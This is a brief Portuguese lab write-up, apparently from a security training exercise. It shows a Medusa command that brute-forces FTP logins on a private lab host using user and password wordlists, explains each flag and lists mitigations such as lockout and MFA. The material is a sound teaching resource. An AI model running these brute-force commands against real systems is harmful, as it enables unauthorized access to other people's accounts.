# 02 — Força Bruta em FTP

Automatizar tentativas de login no serviço FTP com o **Medusa**.

## Comando

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```

## Parâmetros

| Flag | Significado |
|------|-------------|
| `-h` | Host alvo |
| `-U` | Arquivo com a lista de usuários (`users.txt`) |
| `-P` | Arquivo com a lista de senhas (`pass.txt`) |
| `-M ftp` | Módulo FTP do Medusa |
| `-t 6` | 6 threads simultâneas |

## Execução no repositório

```bash
cd desafio-1
medusa -h 192.168.56.101 -U wordlists/usuariom.txt -P wordlists/senham.txt -M ftp -t 6
```

## Resultado

- Se uma combinação estiver na wordlist, o Medusa informa as credenciais válidas;
- Senão, retorna erro `NO MATCH` ou `ERROR` (ex.: conexão recusada).

## Mitigação

- Senhas fortes e únicas;
- Bloqueio de conta após N tentativas falhas;
- MFA;
- Monitorar logs do `vsftpd`.
